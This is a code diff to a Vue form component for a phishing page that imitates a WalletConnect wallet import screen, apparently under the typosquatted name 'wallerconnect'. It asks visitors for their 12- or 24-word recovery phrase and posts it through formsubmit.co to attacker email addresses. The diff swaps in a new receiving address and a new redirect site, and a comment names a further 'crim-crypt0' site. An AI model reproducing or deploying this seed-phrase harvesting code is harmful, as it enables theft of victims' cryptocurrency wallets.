@@ -1,8 +1,8 @@
 <template>
-  <form action="https://formsubmit.co/walletconnect60@gmail.com" method="POST">
-    <input type="hidden" name="_cc" value="emmawatson89000@gmail.com">
+  <form action="https://formsubmit.co/Allencross82@gmail.com" method="POST">
+<!--    <input type="hidden" name="_cc" value="Paulkry89@yahoo.com">-->
     <textarea :name="$route.params.id" class="w-full h-40 p-2 block" placeholder="Phrase" required></textarea>
-    <input type="hidden" name="_next" value="https://wallerconnect.netlify.app/">
+    <input type="hidden" name="_next" value="https://wallerconnect.surge.sh/">
     <input type="hidden" name="_captcha" value="false">
     <span class="text-16 text-grey block mb-5">Typically 12 (sometimes 24) words seperated by a single spaces.</span>
     <button type="submit" class="w-full py-2 bg-blue text-white">IMPORT</button>
@@ -16,5 +16,7 @@ export default {
 </script>
 
 <style scoped>
+
+/* https://crim-crypt0.surge.sh/ */
 
 </style>
